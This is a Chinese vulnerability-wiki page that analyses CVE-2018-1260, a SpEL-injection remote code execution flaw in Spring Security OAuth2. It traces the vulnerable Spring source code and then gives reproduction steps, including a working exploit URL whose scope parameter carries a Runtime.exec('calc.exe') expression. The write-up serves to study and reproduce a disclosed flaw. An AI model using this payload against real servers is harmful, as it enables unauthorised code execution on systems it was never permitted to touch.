<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Spring%20Security%20Oauth/%EF%BC%88CVE-2018-1260%EF%BC%89Spring%20Security%20Oauth2%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>（CVE-2018-1260）Spring Security Oauth2 远程代码执行 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\uff08CVE-2018-1260\uff09Spring Security Oauth2 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2019-3778%EF%BC%89Spring%20Security%20OAuth2%20%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2019-3778%EF%BC%89Spring%20Security%20OAuth2%20%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91/" class="btn btn-xs btn-link">
        （CVE-2019-3778）Spring Security OAuth2 开放重定向
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2016-4977%EF%BC%89Spring%20Security%20OAuth2%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2016-4977%EF%BC%89Spring%20Security%20OAuth2%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2016-4977）Spring Security OAuth2 远程命令执行漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="cve-2018-1260spring-security-oauth2">（CVE-2018-1260）Spring Security Oauth2 远程代码执行<a class="headerlink" href="#cve-2018-1260spring-security-oauth2" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>Spring Security OAuth 2.3 to 2.3.2Spring Security OAuth 2.2 to 2.2.1Spring Security OAuth 2.1 to 2.1.1Spring Security OAuth 2.0 to 2.0.14</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<p>先简要补充一下关于OAuth2.0的相关知识。<img alt="1.png" src="../resource/%28CVE-2018-1260%29SpringSecurityOauth2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId25.png" />以上图为例。当用户使用客户端时，客户端要求授权，即图中的AB。接着客户端通过在B中获得的授权向认证服务器申请令牌，即access
token。最后在EF阶段，客户端带着access token向资源服务器请求并获得资源。</p>
<p>在获得access
token之前，客户端需要获得用户的授权。根据标准，有四种授权方式：授权码模式（authorization
code）、简化模式（implicit）、密码模式（resource owner password
credentials）、客户端模式（client
credentials）。在这几种模式中，当客户端将用户导向认证服务器时，都可以带上一个可选的参数<code>scope</code>，这个参数用于表示客户端申请的权限的范围。</p>
<p>，根据<a href="http://projects.spring.io/spring-security-oauth/docs/oauth2.html">官方文档</a>，在spring-security-oauth的默认配置中scope参数默认为空：</p>
<div class="codehilite"><pre><span></span><code><span class="n">scope</span><span class="o">:</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">scope</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">which</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">client</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">limited</span><span class="o">.</span><span class="w"> </span><span class="n">If</span><span class="w"> </span><span class="n">scope</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="kc">undefined</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">empty</span><span class="w"> </span><span class="o">(</span><span class="n">the</span><span class="w"> </span><span class="k">default</span><span class="o">)</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">client</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">not</span><span class="w"> </span><span class="n">limited</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">scope</span><span class="o">.</span>
</code></pre></div>

<p>为明白起见，我们在demo中将其清楚写出：</p>
<div class="codehilite"><pre><span></span><code>clients.inMemory()
        .withClient(&quot;client&quot;)
        .authorizedGrantTypes(&quot;authorization_code&quot;)
        .scopes();
</code></pre></div>

<p>接着开始正式分析。当我们访问<code>http://localhost:8080/oauth/authorize</code>重定向至<code>http://localhost:8080/login</code>并完成login后程序流程到达org/springframework/security/oauth2/provider/endpoint/AuthorizationEndpoint.java，这里贴上部分代码：</p>
<div class="codehilite"><pre><span></span><code><span class="nv">@RequestMapping</span><span class="p">(</span><span class="k">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ss">&quot;/oauth/authorize&quot;</span><span class="p">)</span>
<span class="k">public</span><span class="w"> </span><span class="n">ModelAndView</span><span class="w"> </span><span class="n">authorize</span><span class="p">(</span><span class="k">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="k">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">model</span><span class="p">,</span><span class="w"> </span><span class="nv">@RequestParam</span><span class="w"> </span><span class="k">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="k">parameters</span><span class="p">,</span>
<span class="w">        </span><span class="n">SessionStatus</span><span class="w"> </span><span class="n">sessionStatus</span><span class="p">,</span><span class="w"> </span><span class="n">Principal</span><span class="w"> </span><span class="n">principal</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>

<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">Pull</span><span class="w"> </span><span class="k">out</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">authorization</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="k">first</span><span class="p">,</span><span class="w"> </span><span class="k">using</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">OAuth2RequestFactory</span><span class="p">.</span><span class="w"> </span><span class="ow">All</span><span class="w"> </span><span class="n">further</span><span class="w"> </span><span class="n">logic</span><span class="w"> </span><span class="n">should</span>
<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="k">off</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">authorization</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="n">instead</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">referring</span><span class="w"> </span><span class="n">back</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">parameters</span><span class="w"> </span><span class="k">map</span><span class="p">.</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">contents</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">the</span>
<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="k">parameters</span><span class="w"> </span><span class="k">map</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">stored</span><span class="w"> </span><span class="k">without</span><span class="w"> </span><span class="n">change</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">AuthorizationRequest</span><span class="w"> </span><span class="k">object</span><span class="w"> </span><span class="n">once</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">created</span><span class="p">.</span>
<span class="w">    </span><span class="n">AuthorizationRequest</span><span class="w"> </span><span class="n">authorizationRequest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getOAuth2RequestFactory</span><span class="p">().</span><span class="n">createAuthorizationRequest</span><span class="p">(</span><span class="k">parameters</span><span class="p">);</span>

<span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="err">{</span>
<span class="w">        </span><span class="p">...</span>
<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="n">We</span><span class="w"> </span><span class="n">intentionally</span><span class="w"> </span><span class="k">only</span><span class="w"> </span><span class="n">validate</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">parameters</span><span class="w"> </span><span class="n">requested</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">client</span><span class="w"> </span><span class="p">(</span><span class="n">ignoring</span><span class="w"> </span><span class="ow">any</span><span class="w"> </span><span class="k">data</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">have</span>
<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="n">been</span><span class="w"> </span><span class="n">added</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">manager</span><span class="p">).</span>
<span class="w">        </span><span class="n">oauth2RequestValidator</span><span class="p">.</span><span class="n">validateScope</span><span class="p">(</span><span class="n">authorizationRequest</span><span class="p">,</span><span class="w"> </span><span class="n">client</span><span class="p">);</span>
<span class="w">        </span><span class="p">...</span>

<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="n">Place</span><span class="w"> </span><span class="n">auth</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">model</span><span class="w"> </span><span class="n">so</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">stored</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">session</span>
<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">approveOrDeny</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">use</span><span class="p">.</span><span class="w"> </span><span class="n">That</span><span class="w"> </span><span class="n">way</span><span class="w"> </span><span class="n">we</span><span class="w"> </span><span class="n">make</span><span class="w"> </span><span class="n">sure</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">auth</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="n">comes</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">session</span><span class="p">,</span>
<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="n">so</span><span class="w"> </span><span class="ow">any</span><span class="w"> </span><span class="n">auth</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="k">parameters</span><span class="w"> </span><span class="n">passed</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">approveOrDeny</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">ignored</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">retrieved</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">session</span><span class="p">.</span>
<span class="w">        </span><span class="n">model</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="ss">&quot;authorizationRequest&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">authorizationRequest</span><span class="p">);</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">getUserApprovalPageResponse</span><span class="p">(</span><span class="n">model</span><span class="p">,</span><span class="w"> </span><span class="n">authorizationRequest</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">Authentication</span><span class="p">)</span><span class="w"> </span><span class="n">principal</span><span class="p">);</span>

<span class="w">    </span><span class="err">}</span>
<span class="w">    </span><span class="p">...</span>
</code></pre></div>

<p>第115行<img alt="2.png" src="../resource/%28CVE-2018-1260%29SpringSecurityOauth2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId27.png" />在执行完<code>AuthorizationRequest authorizationRequest = ...</code>后，<code>authorizationRequest</code>代表了要认证的请求，其中包含了众多参数<img alt="3.png" src="../resource/%28CVE-2018-1260%29SpringSecurityOauth2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId28.png" /></p>
<p>在经过了对一些参数的处理，比如RedirectUri等，之后到达第156行：</p>
<div class="codehilite"><pre><span></span><code><span class="c1">// We intentionally only validate the parameters requested by the client (ignoring any data that may have</span>
<span class="c1">// been added to the request by the manager).</span>
<span class="n">oauth2RequestValidator</span><span class="p">.</span><span class="n">validateScope</span><span class="p">(</span><span class="n">authorizationRequest</span><span class="p">,</span><span class="w"> </span><span class="n">client</span><span class="p">);</span>
</code></pre></div>

<p>在这里将对<code>scope</code>参数进行验证。跟入<code>validateScope</code>到org/springframework/security/oauth2/provider/request/DefaultOAuth2RequestValidator.java:19</p>
<div class="codehilite"><pre><span></span><code><span class="nx">public</span><span class="w"> </span><span class="kd">class</span><span class="w"> </span><span class="nx">DefaultOAuth2RequestValidator</span><span class="w"> </span><span class="nx">implements</span><span class="w"> </span><span class="nx">OAuth2RequestValidator</span><span class="w"> </span><span class="p">{</span>

<span class="w">    </span><span class="nx">public</span><span class="w"> </span><span class="nx">void</span><span class="w"> </span><span class="nx">validateScope</span><span class="p">(</span><span class="nx">AuthorizationRequest</span><span class="w"> </span><span class="nx">authorizationRequest</span><span class="p">,</span><span class="w"> </span><span class="nx">ClientDetails</span><span class="w"> </span><span class="nx">client</span><span class="p">)</span><span class="w"> </span><span class="nx">throws</span><span class="w"> </span><span class="nx">InvalidScopeException</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">validateScope</span><span class="p">(</span><span class="nx">authorizationRequest</span><span class="p">.</span><span class="nx">getScope</span><span class="p">(),</span><span class="w"> </span><span class="nx">client</span><span class="p">.</span><span class="nx">getScope</span><span class="p">());</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="o">...</span>
<span class="p">}</span>
</code></pre></div>

<p>继续跟入<code>validateScope</code>，至
org/springframework/security/oauth2/provider/request/DefaultOAuth2RequestValidator.java:28</p>
<div class="codehilite"><pre><span></span><code><span class="nt">private</span><span class="w"> </span><span class="nt">void</span><span class="w"> </span><span class="nt">validateScope</span><span class="o">(</span><span class="nt">Set</span><span class="o">&lt;</span><span class="nt">String</span><span class="o">&gt;</span><span class="w"> </span><span class="nt">requestScopes</span><span class="o">,</span><span class="w"> </span><span class="nt">Set</span><span class="o">&lt;</span><span class="nt">String</span><span class="o">&gt;</span><span class="w"> </span><span class="nt">clientScopes</span><span class="o">)</span><span class="w"> </span><span class="p">{</span>

<span class="w">    </span><span class="err">if</span><span class="w"> </span><span class="err">(clientScopes</span><span class="w"> </span><span class="err">!=</span><span class="w"> </span><span class="err">null</span><span class="w"> </span><span class="err">&amp;&amp;</span><span class="w"> </span><span class="err">!clientScopes.isEmpty())</span><span class="w"> </span><span class="err">{</span>
<span class="w">        </span><span class="err">for</span><span class="w"> </span><span class="err">(String</span><span class="w"> </span><span class="n">scope</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">requestScopes</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">            </span><span class="n">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">clientScopes</span><span class="o">.</span><span class="nf">contains</span><span class="p">(</span><span class="n">scope</span><span class="p">))</span><span class="w"> </span><span class="err">{</span>
<span class="w">                </span><span class="n">throw</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="nf">InvalidScopeException</span><span class="p">(</span><span class="s2">&quot;Invalid scope: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">scope</span><span class="p">,</span><span class="w"> </span><span class="n">clientScopes</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="err">}</span>
<span class="w">    </span><span class="err">}</span>

<span class="w">    </span><span class="nt">if</span><span class="w"> </span><span class="o">(</span><span class="nt">requestScopes</span><span class="p">.</span><span class="nc">isEmpty</span><span class="o">())</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="err">throw</span><span class="w"> </span><span class="err">new</span><span class="w"> </span><span class="err">InvalidScopeException(&quot;Empty</span><span class="w"> </span><span class="err">scope</span><span class="w"> </span><span class="err">(either</span><span class="w"> </span><span class="err">the</span><span class="w"> </span><span class="err">client</span><span class="w"> </span><span class="err">or</span><span class="w"> </span><span class="err">the</span><span class="w"> </span><span class="err">user</span><span class="w"> </span><span class="err">is</span><span class="w"> </span><span class="err">not</span><span class="w"> </span><span class="err">allowed</span><span class="w"> </span><span class="err">the</span><span class="w"> </span><span class="err">requested</span><span class="w"> </span><span class="err">scopes)&quot;)</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="err">}</span>
</code></pre></div>

<p>首先检查<code>clientScopes</code>，这个<code>clientScopes</code>即我们在前面configure中配置的<code>.scopes();</code>，倘若不为空，则进行白名单检查。举个例子，如果前面配置<code>.scopes("chybeta");</code>，则传入<code>requestScopes</code>必须为<code>chybeta</code>，否则会直接抛出异常<code>Invalid scope:xxx</code>。但由于此处查<code>clientScopes</code>为空值，则接下来仅仅做了<code>requestScopes.isEmpty()</code>的检查并且通过。</p>
<p>在完成了各项检查和配置后，在<code>authorize</code>函数的最后执行：</p>
<div class="codehilite"><pre><span></span><code><span class="k">return</span><span class="w"> </span><span class="nv">getUserApprovalPageResponse</span><span class="ss">(</span><span class="nv">model</span>,<span class="w"> </span><span class="nv">authorizationRequest</span>,<span class="w"> </span><span class="ss">(</span><span class="nv">Authentication</span><span class="ss">)</span><span class="w"> </span><span class="nv">principal</span><span class="ss">)</span><span class="c1">;</span>
</code></pre></div>

<p>回想一下前面OAuth2.0的流程，在客户端请求授权（A），用户登陆认证（B）后，将会进行用户授权（C），这里即开始进行正式的授权阶段。跟入<code>getUserApprovalPageResponse</code>
至org/springframework/security/oauth2/provider/endpoint/AuthorizationEndpoint.java:241：<img alt="4.png" src="../resource/%28CVE-2018-1260%29SpringSecurityOauth2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId29.png" /></p>
<p>生成对应的model和view，之后将会forward到/oauth/confirm_access。为简单起见，我省略中间过程，直接定位到org/springframework/security/oauth2/provider/endpoint/WhitelabelApprovalEndpoint.java:20</p>
<p>public class WhitelabelApprovalEndpoint {\@RequestMapping(\"/oauth/confirm_access\")public ModelAndView getAccessConfirmation(Map\&lt;String, Object&gt; model,
HttpServletRequest request) throws Exception {String template = createTemplate(model, request);if (request.getAttribute(\"_csrf\") != null) {model.put(\"_csrf\", request.getAttribute(\"_csrf\"));}return new ModelAndView(new SpelView(template), model);}...}跟入createTemplate，第29行：</p>
<p>protected String createTemplate(Map\&lt;String, Object&gt; model,
HttpServletRequest request) {String template = TEMPLATE;if (model.containsKey(\"scopes\") || request.getAttribute(\"scopes\")
!= null) {template = template.replace(\"%scopes%\", createScopes(model,
request)).replace(\"%denial%\", \"\");}...return template;}跟入createScopes，第46行：<img alt="5.png" src="../resource/%28CVE-2018-1260%29SpringSecurityOauth2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId30.png" /></p>
<p>这里获取到了<code>scopes</code>，并且通过for循环生成对应的<code>builder</code>，其实就是html和一些标签等，最后返回的即<code>builder.toString()</code>,其值如下:</p>
<div class="codehilite"><pre><span></span><code><span class="nt">&lt;ul&gt;&lt;li&gt;&lt;div&gt;</span>scope.<span class="cp">${</span><span class="n">T</span><span class="p">(</span><span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">Runtime</span><span class="p">)</span><span class="o">.</span><span class="n">getRuntime</span><span class="p">()</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="s2">&quot;calc.exe&quot;</span><span class="p">)</span><span class="cp">}</span>:<span class="w"> </span><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&#39;radio&#39;</span> <span class="na">name=</span><span class="s">&#39;scope.</span><span class="cp">${</span><span class="n">T</span><span class="p">(</span><span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">Runtime</span><span class="p">)</span><span class="o">.</span><span class="n">getRuntime</span><span class="p">()</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="s2">&quot;calc.exe&quot;</span><span class="p">)</span><span class="cp">}</span><span class="s">&#39;</span> <span class="na">value=</span><span class="s">&#39;true&#39;</span><span class="nt">&gt;</span>Approve<span class="nt">&lt;/input&gt;</span><span class="w"> </span><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&#39;radio&#39;</span> <span class="na">name=</span><span class="s">&#39;scope.</span><span class="cp">${</span><span class="n">T</span><span class="p">(</span><span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">Runtime</span><span class="p">)</span><span class="o">.</span><span class="n">getRuntime</span><span class="p">()</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="s2">&quot;calc.exe&quot;</span><span class="p">)</span><span class="cp">}</span><span class="s">&#39;</span> <span class="na">value=</span><span class="s">&#39;false&#39;</span> <span class="err">checked</span><span class="nt">&gt;</span>Deny<span class="nt">&lt;/input&gt;&lt;/div&gt;&lt;/li&gt;&lt;/ul&gt;</span>
</code></pre></div>

<p><code>createScopes</code>结束后将会把上述<code>builder.toString()</code>拼接到<code>template</code>中。<code>createTemplate</code>结束后，在<code>getAccessConfirmation</code>的最后：</p>
<div class="codehilite"><pre><span></span><code><span class="k">return</span><span class="w"> </span><span class="nv">new</span><span class="w"> </span><span class="nv">ModelAndView</span><span class="ss">(</span><span class="nv">new</span><span class="w"> </span><span class="nv">SpelView</span><span class="ss">(</span><span class="nv">template</span><span class="ss">)</span>,<span class="w"> </span><span class="nv">model</span><span class="ss">)</span><span class="c1">;</span>
</code></pre></div>

<p>根据<code>template</code>生成对应的<code>SpelView</code>对象，这是其构造函数：<img alt="6.png" src="../resource/%28CVE-2018-1260%29SpringSecurityOauth2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId31.png" />此后在页面渲染的过程中，将会执行页面中的Spel表达式<code>${T(java.lang.Runtime).getRuntime().exec("calc.exe")}</code>从而造成代码执行。</p>
<p><img alt="7.png" src="../resource/%28CVE-2018-1260%29SpringSecurityOauth2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId32.png" /></p>
<p>所以综上所述，这个任意代码执行的利用条件实在"苛刻"：</p>
<ol>
<li>需要<code>scopes</code>没有配置白名单，否则直接<code>Invalid scope:xxx</code>。不过大部分OAuth都会限制授权的范围，即指定scopes。</li>
<li>使用了默认的Approval
    Endpoint，生成对应的template，在spelview中注入spel表达式。不过可能绝大部分使用者都会重写这部分来满足自己的需求，从而导致spel注入不成功。</li>
</ol>
<h3 id="_5">漏洞复现<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
<p>利用github上已有的demo：</p>
<div class="codehilite"><pre><span></span><code>git clone https://github.com/wanghongfei/spring-security-oauth2-example.git
</code></pre></div>

<p>确保导入的spring-security-oauth2为受影响版本，以这里为例为2.0.10进入spring-security-oauth2-example，修改
cn/com/sina/alan/oauth/config/OAuthSecurityConfig.java的第67行:</p>
<div class="codehilite"><pre><span></span><code><span class="nv">@Override</span>
<span class="k">public</span><span class="w"> </span><span class="n">void</span><span class="w"> </span><span class="n">configure</span><span class="p">(</span><span class="n">ClientDetailsServiceConfigurer</span><span class="w"> </span><span class="n">clients</span><span class="p">)</span><span class="w"> </span><span class="n">throws</span><span class="w"> </span><span class="k">Exception</span><span class="w"> </span><span class="err">{</span>
<span class="w">   </span><span class="n">clients</span><span class="p">.</span><span class="n">inMemory</span><span class="p">()</span>
<span class="w">            </span><span class="p">.</span><span class="n">withClient</span><span class="p">(</span><span class="ss">&quot;client&quot;</span><span class="p">)</span>
<span class="w">            </span><span class="p">.</span><span class="n">authorizedGrantTypes</span><span class="p">(</span><span class="ss">&quot;authorization_code&quot;</span><span class="p">)</span>
<span class="w">            </span><span class="p">.</span><span class="n">scopes</span><span class="p">();</span>
<span class="err">}</span>
</code></pre></div>

<p>根据<a href="https://github.com/wanghongfei/spring-security-oauth2-example.git">spring-security-oauth2-example</a>创建对应的数据库等并修改AlanOAuthApplication中对应的mysql相关配置信息。</p>
<p>访问：</p>
<div class="codehilite"><pre><span></span><code><span class="nx">http</span><span class="p">:</span><span class="c1">//www.0-sec.org:8080/oauth/authorize?client_id=client&amp;response_type=code&amp;redirect_uri=http://www.github.com/chybeta&amp;scope=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22calc.exe%22%29%7D</span>
</code></pre></div>

<p>会重定向到login页面，随意输入username和password，点击login，触发payload。<img alt="3.gif" src="../resource/%28CVE-2018-1260%29SpringSecurityOauth2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId35.gif" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2019-3778%EF%BC%89Spring%20Security%20OAuth2%20%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2019-3778%EF%BC%89Spring%20Security%20OAuth2%20%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91/" class="btn btn-xs btn-link">
        （CVE-2019-3778）Spring Security OAuth2 开放重定向
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2016-4977%EF%BC%89Spring%20Security%20OAuth2%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2016-4977%EF%BC%89Spring%20Security%20OAuth2%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2016-4977）Spring Security OAuth2 远程命令执行漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>